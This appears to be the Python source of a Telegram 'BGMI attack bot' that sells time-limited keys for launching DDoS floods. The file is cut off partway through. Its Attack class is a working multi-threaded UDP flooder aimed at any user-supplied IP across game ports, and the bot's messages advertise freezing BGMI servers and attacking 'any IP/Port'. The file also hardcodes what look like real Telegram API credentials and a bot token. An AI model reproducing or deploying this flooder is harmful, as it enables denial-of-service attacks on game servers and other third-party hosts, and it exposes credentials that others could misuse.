#!/usr/bin/env python3
"""
💎 BGMI ATTACK BOT - ULTRA PRO
ALL WORKING | NO CONFLICTS
"""

import asyncio, json, random, os, time, socket, threading, logging, string, uuid
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)
from pyrogram.errors import FloodWait

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %message)s')
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
OWNER_ID = 1987818347
OWNER_USERNAME = "FathersOfCreater"
OWNER_LINK = f"https://t.me/{OWNER_USERNAME}"
BOT_USERNAME = "BeStChEaT_BGMIDdos_Bot"

# ═══════════════ DATABASE ═══════════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
KEYS_DB = "keys.json"
BLOCKED_DB = "blocked.json"
HISTORY_DB = "history.json"
STICKER_DB = "sticker.json"
EMOJI_DB = "emojis.json"
STICKER_TIME_DB = "sticker_times.json"
SETTINGS_DB = "settings.json"
STOP_STICKER_DB = "stop_sticker.json"

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"

# ═══════════════ SETTINGS ═══════════════
PREMIUM_THREADS = 5000
PREMIUM_TIME = 600
DEFAULT_STICKER_TIME = 5
DEFAULT_VIDEO_DELAY = 3

# ═══════════════ HELPERS ═══════════════
def jload(f, d=None):
    try:
        if os.path.exists(f):
            with open(f) as fl: return json.load(fl)
    except: pass
    return d if d is not None else {}

def jsave(f, d):
    with open(f, 'w') as fl: json.dump(d, fl, indent=2)

def generate_unique_key():
    prefixes = ["BGMI", "VIP", "PRO", "ELITE", "LEGEND", "MYTHIC", "ULTRA"]
    prefix = random.choice(prefixes)
    seg1 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    seg2 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    unique_id = str(uuid.uuid4())[:8].upper()
    return f"{prefix}-{seg1}-{seg2}-{unique_id}"

def parse_duration(time_str):
    if not time_str: return None
    time_str = time_str.lower().strip()
    try:
        if 'min' in time_str: return int(time_str.replace('min','').replace('mins','').strip()), 'minutes'
        elif time_str.endswith('m'): return int(time_str[:-1]), 'minutes'
        elif 'h' in time_str: return int(time_str.replace('h','').replace('hr','').replace('hrs','').replace('hour','').replace('hours','').strip()), 'hours'
        elif 'd' in time_str: return int(time_str.replace('d','').replace('day','').replace('days','').strip()), 'days'
        elif 'w' in time_str: return int(time_str.replace('w','').replace('wk','').replace('wks','').replace('week','').replace('weeks','').strip()), 'weeks'
        elif 'mo' in time_str: return int(time_str.replace('mo','').replace('month','').replace('months','').strip()), 'months'
        else: return int(time_str), 'hours'
    except: return None

def calc_expiry(value, unit):
    now = datetime.now(IST)
    if unit == 'minutes': return now + timedelta(minutes=value)
    elif unit == 'hours': return now + timedelta(hours=value)
    elif unit == 'days': return now + timedelta(days=value)
    elif unit == 'weeks': return now + timedelta(weeks=value)
    elif unit == 'months': return now + timedelta(days=value*30)
    return now + timedelta(hours=value)

def format_duration(value, unit):
    names = {'minutes':'Minute','hours':'Hour','days':'Day','weeks':'Week','months':'Month'}
    name = names.get(unit, unit)
    return f"{value} {name}{'s' if value != 1 else ''}"

def get_remaining(expiry_str):
    try:
        expiry = datetime.fromisoformat(expiry_str)
        now = datetime.now(IST)
        if now >= expiry: return "EXPIRED", True
        diff = expiry - now
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        seconds = diff.seconds % 60
        if days > 30: return f"{days//30}M+", False
        elif days > 0: return f"{days}D {hours}H {minutes}M", False
        elif hours > 0: return f"{hours}H {minutes}M {seconds}S", False
        elif minutes > 0: return f"{minutes}M {seconds}S", False
        else: return f"{seconds}S", False
    except: return "ERROR", False

# ═══════════════ SETTINGS FUNCTIONS ═══════════════
def get_settings():
    return jload(SETTINGS_DB, {"sticker_time": DEFAULT_STICKER_TIME, "video_delay": DEFAULT_VIDEO_DELAY})

def save_settings(sticker_time=None, video_delay=None):
    settings = get_settings()
    if sticker_time is not None:
        settings["sticker_time"] = sticker_time
    if video_delay is not None:
        settings["video_delay"] = video_delay
    jsave(SETTINGS_DB, settings)
    return settings

def get_sticker_display_time():
    settings = get_settings()
    return settings.get("sticker_time", DEFAULT_STICKER_TIME)

def get_video_delay_time():
    settings = get_settings()
    return settings.get("video_delay", DEFAULT_VIDEO_DELAY)

# ═══════════════ STOP STICKER FUNCTIONS ═══════════════
def get_stop_sticker():
    data = jload(STOP_STICKER_DB, {"sticker_id": None})
    return data.get("sticker_id")

def set_stop_sticker(sticker_id):
    jsave(STOP_STICKER_DB, {"sticker_id": sticker_id})
    return True

def clear_stop_sticker():
    jsave(STOP_STICKER_DB, {"sticker_id": None})
    return True

# ═══════════════ STICKER FUNCTIONS ═══════════════
def get_stickers():
    data = jload(STICKER_DB, {"stickers": []})
    return data

def add_sticker(sticker_id, duration=None):
    data = get_stickers()
    if sticker_id not in data["stickers"]:
        data["stickers"].append(sticker_id)
        jsave(STICKER_DB, data)
        if duration:
            sticker_times = jload(STICKER_TIME_DB, {})
            sticker_times[sticker_id] = duration
            jsave(STICKER_TIME_DB, sticker_times)
        return True, len(data["stickers"])
    return False, len(data["stickers"])

def remove_sticker(index):
    data = get_stickers()
    if 0 <= index < len(data["stickers"]):
        removed = data["stickers"].pop(index)
        jsave(STICKER_DB, data)
        return True, removed, len(data["stickers"])
    return False, None, len(data["stickers"])

def get_all_stickers():
    return get_stickers()["stickers"]

def reset_stickers():
    jsave(STICKER_DB, {"stickers": []})
    jsave(STICKER_TIME_DB, {})
    return True

def get_random_sticker():
    stickers = get_all_stickers()
    if stickers:
        return random.choice(stickers)
    return None

# ═══════════════ EMOJI FUNCTIONS ═══════════════
def get_emojis():
    data = jload(EMOJI_DB, {"emojis": []})
    return data

def add_emoji(emoji_id):
    data = get_emojis()
    if emoji_id not in data["emojis"]:
        data["emojis"].append(emoji_id)
        jsave(EMOJI_DB, data)
        return True, len(data["emojis"])
    return False, len(data["emojis"])

def remove_emoji(index):
    data = get_emojis()
    if 0 <= index < len(data["emojis"]):
        removed = data["emojis"].pop(index)
        jsave(EMOJI_DB, data)
        return True, removed, len(data["emojis"])
    return False, None, len(data["emojis"])

def get_all_emojis():
    return get_emojis()["emojis"]

def reset_emojis():
    jsave(EMOJI_DB, {"emojis": []})
    return True

def get_random_emoji():
    emojis = get_all_emojis()
    if emojis:
        return random.choice(emojis)
    return None

# ═══════════════ VIDEO FUNCTIONS ═══════════════
def get_vids(): return jload(VIDEO_DB, [])
def add_vid(path):
    vids = get_vids()
    vid = len(vids) + 1
    vids.append({"id": vid, "path": path, "name": os.path.basename(path)})
    jsave(VIDEO_DB, vids)
    return vid

def rand_vid():
    vids = get_vids()
    if vids:
        return random.choice(vids)
    return None

def del_vid(vid):
    vids = get_vids()
    for i, v in enumerate(vids):
        if v["id"] == vid:
            if os.path.exists(v["path"]): os.remove(v["path"])
            vids.pop(i); jsave(VIDEO_DB, vids)
            return True
    return False

def clear_vids():
    vids = get_vids()
    for v in vids:
        if os.path.exists(v["path"]): os.remove(v["path"])
    jsave(VIDEO_DB, [])
    return len(vids)

# ═══════════════ USER FUNCTIONS ═══════════════
def get_users(): return jload(USERS_DB, {"premium": [], "keys": {}})
def get_blocked(): return jload(BLOCKED_DB, [])
def is_blocked(uid): return str(uid) in get_blocked()

def check_access(uid):
    if is_blocked(uid): return False, "BLOCKED"
    if uid == OWNER_ID: return True, "OWNER"
    u = get_users()
    if str(uid) in u.get("premium", []): return True, "PREMIUM"
    uk = u.get("keys", {}).get(str(uid), {})
    if uk:
        try:
            if datetime.now(IST) < datetime.fromisoformat(uk["expiry"]):
                r, _ = get_remaining(uk["expiry"])
                return True, f"KEY ({r})"
            else:
                del u["keys"][str(uid)]; jsave(USERS_DB, u)
        except: pass
    return False, "NONE"

def get_user_info(uid):
    access, a_type = check_access(uid)
    info = {"access": access, "type": a_type, "threads": PREMIUM_THREADS if access else 0, "max_time": PREMIUM_TIME if access else 0, "expiry": None, "remaining": None}
    if a_type.startswith("KEY"):
        uk = get_users().get("keys", {}).get(str(uid), {})
        if uk:
            info["expiry"] = uk.get("expiry")
            if info["expiry"]: info["remaining"], _ = get_remaining(info["expiry"])
    return info

def grant_access(uid, key_name, duration_str, expiry):
    u = get_users()
    if "keys" not in u: u["keys"] = {}
    u["keys"][str(uid)] = {"key_name": key_name, "duration": duration_str, "expiry": expiry.isoformat(), "granted_at": datetime.now(IST).isoformat()}
    jsave(USERS_DB, u)

def remove_expired():
    u = get_users(); removed = 0
    if "keys" in u:
        exp = [uid for uid, data in u["keys"].items() if datetime.now(IST) >= datetime.fromisoformat(data["expiry"])]
        for uid in exp: del u["keys"][uid]; removed += 1
        if removed > 0: jsave(USERS_DB, u)
    return removed

# ═══════════════ HISTORY ═══════════════
def get_history(): return jload(HISTORY_DB, {})
def add_history(uid, action, details):
    h = get_history()
    if str(uid) not in h: h[str(uid)] = []
    h[str(uid)].append({"action": action, "details": details, "time": datetime.now(IST).isoformat()})
    if len(h[str(uid)]) > 50: h[str(uid)] = h[str(uid)][-50:]
    jsave(HISTORY_DB, h)

def get_user_history(uid):
    return get_history().get(str(uid), [])

# ═══════════════ KEY FUNCTIONS ═══════════════
def get_keys(): return jload(KEYS_DB, {})
def create_key(name, time_str):
    keys = get_keys()
    key_code = generate_unique_key()
    while key_code in keys: key_code = generate_unique_key()
    parsed = parse_duration(time_str)
    if not parsed: return None, None
    value, unit = parsed
    keys[key_code] = {"name": name, "time_value": value, "time_unit": unit, "duration_display": format_duration(value, unit), "created": datetime.now(IST).isoformat(), "used_by": None, "active": True}
    jsave(KEYS_DB, keys)
    return key_code, format_duration(value, unit)

def redeem_key_code(key_code, user_id):
    keys = get_keys()
    if key_code not in keys: return False, "Invalid key!"
    key = keys[key_code]
    if not key["active"]: return False, "Key already used!"
    expiry = calc_expiry(key["time_value"], key["time_unit"])
    grant_access(user_id, key["name"], key["duration_display"], expiry)
    key["used_by"] = str(user_id); key["used_at"] = datetime.now(IST).isoformat(); key["active"] = False
    jsave(KEYS_DB, keys)
    add_history(user_id, "KEY_REDEEMED", f"{key['duration_display']}")
    return True, expiry.strftime('%d %B %Y, %I:%M %p')

# ═══════════════ ATTACK ENGINE ═══════════════
class Attack:
    def __init__(self):
        self.on = False; self.pkts = 0; self.bytes_out = 0; self.lock = threading.Lock()
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        while self.on and time.time() < end:
            try:
                for _ in range(20):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        e = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
ainfo = {}
amsg = None
attack_user = None

# ═══════════════ BOT ═══════════════
app = Client("bgmi_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ═══════════════ STYLISH TEXT ═══════════════
def premium_text(text, style_num=1):
    return f"✦{text}✦"

# ═══════════════ BUTTONS ═══════════════
def main_menu_kb(is_owner=False):
    buttons = [
        [InlineKeyboardButton("⚔ ATTACK", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("▓ STATUS", callback_data="status_btn"),
         InlineKeyboardButton("ⓘ INFO", callback_data="info_menu")],
        [InlineKeyboardButton("⚿ REDEEM KEY", callback_data="redeem_menu")],
        [InlineKeyboardButton("⌨ COMMANDS", callback_data="commands_menu")]
    ]
    if is_owner:
        buttons.append([InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")])
        buttons.append([InlineKeyboardButton("▶ VIDEO MANAGER", callback_data="video_menu")])
        buttons.append([InlineKeyboardButton("★ EMOJI MANAGER", callback_data="emoji_menu")])
        buttons.append([InlineKeyboardButton("❄ STICKER MANAGER", callback_data="sticker_menu")])
        buttons.append([InlineKeyboardButton("⚜ ADMIN PANEL", callback_data="admin_menu")])
    return InlineKeyboardMarkup(buttons)

def back_to_menu_kb(is_owner=False):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⌂ MAIN MENU", callback_data="menu")]
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚿ ADD KEY", callback_data="admin_addkey")],
        [InlineKeyboardButton("⚜ AUTO GEN KEY", callback_data="admin_auto")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌘ ALL KEYS", callback_data="admin_keys")],
        [InlineKeyboardButton("⎙ STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("↺ CLEAR EXPIRED", callback_data="admin_clear")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌂ MAIN MENU", callback_data="menu")]
    ])

def video_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⎘ ADD VIDEO", callback_data="v_add")],
        [InlineKeyboardButton("⌫ DELETE VIDEO", callback_data="v_del")],
        [InlineKeyboardButton("⎚ CLEAR ALL", callback_data="v_clear")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌘ LIST VIDEOS", callback_data="v_list")],
        [InlineKeyboardButton("❓ HELP", callback_data="v_help")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌂ MAIN MENU", callback_data="menu")]
    ])

def emoji_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⎘ ADD EMOJI", callback_data="e_add")],
        [InlineKeyboardButton("⌫ REMOVE EMOJI", callback_data="e_remove")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌘ LIST EMOJIS", callback_data="e_list")],
        [InlineKeyboardButton("↺ RESET ALL", callback_data="e_reset")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌂ MAIN MENU", callback_data="menu")]
    ])

def sticker_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⎘ ADD STICKER", callback_data="s_add")],
        [InlineKeyboardButton("⌫ REMOVE STICKER", callback_data="s_remove")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌘ LIST STICKERS", callback_data="s_list")],
        [InlineKeyboardButton("↺ RESET ALL", callback_data="s_reset")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌂ MAIN MENU", callback_data="menu")]
    ])

def auto_key_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏱ 20 MINUTE", callback_data="ak_20m"),
         InlineKeyboardButton("⏱ 40 MINUTE", callback_data="ak_40m"),
         InlineKeyboardButton("⏱ 60 MINUTE", callback_data="ak_60m")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌚ 1 DAY", callback_data="ak_1d"),
         InlineKeyboardButton("⌚ 3 DAY", callback_data="ak_3d"),
         InlineKeyboardButton("⌚ 7 DAY", callback_data="ak_7d")],
        [InlineKeyboardButton("⌚ 15 DAY", callback_data="ak_15d"),
         InlineKeyboardButton("⌚ 23 DAY", callback_data="ak_23d"),
         InlineKeyboardButton("⌚ 30 DAY", callback_data="ak_30d")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⎚ 1 MONTH", callback_data="ak_1mo"),
         InlineKeyboardButton("⎚ 2 MONTH", callback_data="ak_2mo"),
         InlineKeyboardButton("⎚ 3 MONTH", callback_data="ak_3mo")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌂ MAIN MENU", callback_data="menu")]
    ])

# ═══════════════ COMMANDS LIST ═══════════════
def get_commands_list(is_owner=False):
    user_commands = """
╔══════════════════════════════════════╗
║         ⌨ COMMANDS LIST             ║
╚══════════════════════════════════════╝

╔══════════════════════════════════════╗
║      👤 USER COMMANDS                ║
╚══════════════════════════════════════╝

/start - ✨ BOT START KAREIN
/attack - ⚔ ATTACK START KAREIN
/stop - ⛔ ATTACK STOP KAREIN
/redeem - ⚿ KEY REDEEM KAREIN
/status - 📊 STATUS CHECK KAREIN
/commands - 📝 COMMANDS DEKHEIN

╔══════════════════════════════════════╗
║      🎯 ATTACK HELP                  ║
╚══════════════════════════════════════╝

Format: /attack IP PORT TIME
Example: /attack 1.2.3.4 8080 600
BGMI Ports: 7000 - 15000
Max Time: 600 Seconds (10 Minutes)

╔══════════════════════════════════════╗
║      🔑 REDEEM HELP                  ║
╚══════════════════════════════════════╝

Format: /redeem KEY_CODE
Example: /redeem BGMI-XXXX-XXXX-XXXX

╔══════════════════════════════════════╗
║      ⏱ DURATIONS                    ║
╚══════════════════════════════════════╝

30m - 30 Minutes
1h - 1 Hour
24h - 24 Hours
7d - 7 Days
2w - 2 Weeks
1mo - 1 Month
3mo - 3 Months
"""
    
    owner_commands = """
╔══════════════════════════════════════╗
║      ⚜ OWNER COMMANDS               ║
╚══════════════════════════════════════╝

🎨 STICKER COMMANDS
/addsticker - ⎘ STICKER ADD KAREIN
/removesticker - ⌫ STICKER REMOVE KAREIN
/liststickers - ⌘ STICKERS DEKHEIN
/resetstickers - ↺ STICKERS RESET KAREIN
/setstickertime - ⏱ SINGLE STICKER TIME SET
/setallstickertime - ⏱ ALL STICKERS TIME SET

⛔ STOP STICKER COMMANDS
/addstop - ⎘ STOP STICKER ADD KAREIN
/removestop - ⌫ STOP STICKER REMOVE KAREIN

🎯 EMOJI COMMANDS
/addemoji - ⎘ EMOJI ADD KAREIN
/removeemoji - ⌫ EMOJI REMOVE KAREIN
/listemojis - ⌘ EMOJIS DEKHEIN
/resetemojis - ↺ EMOJIS RESET KAREIN

🎬 VIDEO COMMANDS
/addvideo - ⎘ VIDEO ADD KAREIN
/delvideo - ⌫ VIDEO DELETE KAREIN
/videos - ⌘ VIDEOS DEKHEIN
/clearvideos - ⎚ VIDEOS CLEAR KAREIN
/setvideodelay - ⏱ VIDEO DELAY SET KAREIN

🔑 KEY COMMANDS
/genkey - ⚿ KEY GENERATE KAREIN
/admin_keys - ⌘ ALL KEYS DEKHEIN
/admin_stats - ⎙ STATISTICS DEKHEIN
/admin_clear - ↺ EXPIRED CLEAR KAREIN

⚙️ SETTINGS COMMANDS
/settings - ⚙️ SHOW SETTINGS
"""
    
    if is_owner:
        return user_commands + owner_commands
    return user_commands

# ═══════════════ START COMMAND ═══════════════
@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, msg):
    user = msg.from_user
    user_id = user.id
    is_owner = (user_id == OWNER_ID)
    
    # Send welcome sticker if available
    sticker_id = get_random_sticker()
    if sticker_id:
        try:
            await msg.reply_sticker(sticker_id)
        except:
            pass
    
    text = f"""
👋 Hello [{user.first_name}](tg://user?id={user_id})!

💀 **BGMI ATTACK BOT** 💀

┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ I have special features
┠ ◆ All-in-one bot
┗━━━━━━━━━━━━━━━━━⧫
┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ You can freeze BGMI server
┠ ◆ You can DDOS any IP/Port
┠ ◆ You can use 5000+ threads
┠ ◆ I can attack upto 10 minutes
┗━━━━━━━━━━━━━━━━━⧫

📌 Use /attack to start attacking
📌 Use /commands to see all commands
"""
    
    await msg.reply_text(text, reply_markup=main_menu_kb(is_owner))

# ═══════════════ COMMANDS COMMAND ═══════════════
@app.on_message(filters.command("commands") & filters.private)
async def commands_cmd(client, msg):
    uid = msg.from_user.id
    is_owner = (uid == OWNER_ID)
    text = get_commands_list(is_owner)
    await msg.reply_text(text, reply_markup=back_to_menu_kb(is_owner))

# ═══════════════ STOP COMMAND ═══════════════
@app.on_message(filters.command("stop") & filters.private)
async def stop_cmd(client, msg):
    global attacking
    uid = msg.from_user.id
    
    if not check_access(uid)[0]:
        await msg.reply_text("🔒 Access Denied!")
        return
    
    if attacking:
        stop_sticker = get_stop_sticker()
        if stop_sticker:
            try:
                await msg.reply_sticker(stop_sticker)
            except:
                pass
        
        attacker.on = False
        attacking = False
        
        await msg.reply_text(
            f"✅ **ATTACK STOPPED**\n\n"
            f"📦 Packets: {attacker.pkts:,}\n"
            f"🔄 /attack IP PORT TIME"
        )
    else:
        await msg.reply_text("💤 No attack running!")

# ═══════════════ STATUS COMMAND ═══════════════
@app.on_message(filters.command("status") & filters.private)
async def status_cmd(client, msg):
    uid = msg.from_user.id
    
    if not check_access(uid)[0]:
        await msg.reply_text("🔒 Access Denied!")
        return
    
    info = get_user_info(uid)
    
    text = f"""
📊 **SYSTEM STATUS**

╔══════════════════════════╗
║ 👤 {msg.from_user.first_name}
║ 🆔 {uid}
║ 💳 {info['type']}
╠══════════════════════════╣
║ ⚡ Threads: {info['threads']}
║ ⏱️ Max Time: {info['max_time']}s
╠══════════════════════════╣
║ 🟢 Attack: {'🟢 ACTIVE' if attacking else '💤 IDLE'}
╚══════════════════════════╝
"""
    
    if attacking:
        e = time.time() - ainfo['start']
        text += f"\n⏱️ Running: {int(e)}s\n📦 Packets: {attacker.pkts:,}"
    
    await msg.reply_text(text)

# ═══════════════ REDEEM COMMAND ═══════════════
@app.on_message(filters.command("redeem") & filters.private)
async def redeem_cmd(client, msg):
    uid = msg.from_user.id
    access, a_type = check_access(uid)
    
    if access:
        return await msg.reply_text(f"✅ Already unlocked!\n💳 {a_type}")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⚿ REDEEM KEY\n\n"
            f"📋 /redeem KEY\n"
            f"🔑 /redeem BGMI-XXXX-XXXX-XXXX"
        )
    
    key = parts[1].upper()
    success, result = redeem_key_code(key, uid)
    
    if success:
        await msg.reply_text(f"🎉 KEY REDEEMED!\n\n📅 Expires: {result}")
    else:
        await msg.reply_text(f"❌ {result}")

# ═══════════════ ATTACK COMMAND ═══════════════
@app.on_message(filters.command("attack") & filters.private)
async def attack_cmd(client, msg):
    global attacking, ainfo, amsg, attack_user
    uid = msg.from_user.id
    
    access, a_type = check_access(uid)
    if not access:
        return await msg.reply_text("🔒 Access Denied!\n\nBuy key from @FathersOfCreater")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply_text("⚠️ /attack IP PORT TIME\n📋 /attack 1.2.3.4 8080 600")
    
    if attacking:
        return await msg.reply_text("⚠️ Already attacking!\n🛑 Use /stop")
    
    ip = parts[1]
    try: port = int(parts[2])
    except: return await msg.reply_text("❌ Invalid port!")
    try: dur = int(parts[3])
    except: return await msg.reply_text("❌ Invalid time!")
    
    info = get_user_info(uid)
    threads = info['threads']
    max_t = info['max_time']
    if dur > max_t: dur = max_t
    
    ainfo = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True
    attack_user = uid
    
    text = f"""
💀 **ATTACK LAUNCHED**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ ⏱️ Duration: {dur}s
║ 🧵 Threads: {threads}
║ 👤 User: {uid}
╚══════════════════════════╝

⚡ Attack in progress...
🔴 Press STOP to abort
"""
    amsg = await msg.reply_text(text)
    add_history(uid, "ATTACK START", f"{ip}:{port} | {dur}s")
    
    async def live():
        t0 = time.time()
        while attacking:
            await asyncio.sleep(2)
            try:
                e = time.time() - t0
                if e >= dur: break
                pct = (e/dur)*100
                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                await amsg.edit_text(
                    f"💀 **ATTACKING**\n\n"
                    f"╔══════════════════════════╗\n"
                    f"║ 🎯 {ip}:{port}\n"
                    f"║ ⏱️ {int(e)}s / {dur}s\n"
                    f"║ 📊 [{bar}] {pct:.0f}%\n"
                    f"║ 📦 {attacker.pkts:,} pkts\n"
                    f"║ 📶 {mbps:.1f} Mbps\n"
                    "╚══════════════════════════╝\n\n"
                    f"🛑 Press STOP to abort"
                )
            except: pass
    
    asyncio.create_task(live())
    
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    attacking = False
    attack_user = None
    
    add_history(uid, "ATTACK END", f"{ip}:{port} | {stats['pkts']:,} pkts")
    
    done = f"""
✅ **ATTACK COMPLETED**

╔══════════════════════════╗
║ 🎯 {ip}:{port}
║ 📦 {stats['pkts']:,} pkts
║ 📶 {stats['mbps']:.1f} Mbps
║ ⏱️ {dur}s Completed
╚══════════════════════════╝

🔄 /attack IP PORT TIME
"""
    await amsg.edit_text(done)

# ═══════════════ ADD STOP STICKER ═══════════════
@app.on_message(filters.command("addstop") & filters.private)
async def add_stop_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message or not msg.reply_to_message.sticker:
        return await msg.reply_text(
            "⛔ ADD STOP STICKER\n\n"
            "Reply to a sticker with:\n"
            "`/addstop`"
        )
    
    sticker_id = msg.reply_to_message.sticker.file_id
    set_stop_sticker(sticker_id)
    await msg.reply_text("✅ STOP STICKER ADDED!\n\nNow /stop will use this sticker.")

@app.on_message(filters.command("removestop") & filters.private)
async def remove_stop_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    clear_stop_sticker()
    await msg.reply_text("✅ STOP STICKER REMOVED!")

# ═══════════════ ADD STICKER ═══════════════
@app.on_message(filters.command("addsticker") & filters.private)
async def add_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message or not msg.reply_to_message.sticker:
        return await msg.reply_text(
            "⎘ ADD STICKER\n\n"
            "Reply to a sticker with:\n"
            "`/addsticker`"
        )
    
    sticker_id = msg.reply_to_message.sticker.file_id
    duration = get_sticker_display_time()
    success, total = add_sticker(sticker_id, duration)
    
    if success:
        await msg.reply_text(f"✅ STICKER ADDED!\n\nTotal Stickers: {total}\n⏱️ Duration: {duration}s")
    else:
        await msg.reply_text("❌ Sticker already exists!")

@app.on_message(filters.command("liststickers") & filters.private)
async def list_stickers_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    stickers = get_all_stickers()
    if not stickers:
        return await msg.reply_text("📭 No stickers added yet!")
    
    text = f"⌘ STICKER LIST ({len(stickers)})\n\n"
    for i, sid in enumerate(stickers, 1):
        text += f"{i}. `{sid[:20]}...`\n"
    
    await msg.reply_text(text)

@app.on_message(filters.command("resetstickers") & filters.private)
async def reset_stickers_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    reset_stickers()
    await msg.reply_text("↺ ALL STICKERS RESET!")

# ═══════════════ EMOJI COMMANDS ═══════════════
@app.on_message(filters.command("addemoji") & filters.private)
async def add_emoji_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message or not msg.reply_to_message.sticker:
        return await msg.reply_text(
            "⎘ ADD EMOJI\n\n"
            "Reply to a sticker with:\n"
            "`/addemoji`"
        )
    
    emoji_id = msg.reply_to_message.sticker.file_id
    success, total = add_emoji(emoji_id)
    
    if success:
        await msg.reply_text(f"✅ EMOJI ADDED!\n\nTotal Emojis: {total}")
    else:
        await msg.reply_text("❌ Emoji already exists!")

@app.on_message(filters.command("listemojis") & filters.private)
async def list_emojis_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    emojis = get_all_emojis()
    if not emojis:
        return await msg.reply_text("📭 No emojis added yet!")
    
    text = f"⌘ EMOJI LIST ({len(emojis)})\n\n"
    for i, eid in enumerate(emojis, 1):
        text += f"{i}. `{eid[:20]}...`\n"
    
    await msg.reply_text(text)

@app.on_message(filters.command("resetemojis") & filters.private)
async def reset_emojis_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    reset_emojis()
    await msg.reply_text("↺ ALL EMOJIS RESET!")

# ═══════════════ VIDEO COMMANDS ═══════════════
@app.on_message(filters.command("addvideo") & filters.private)
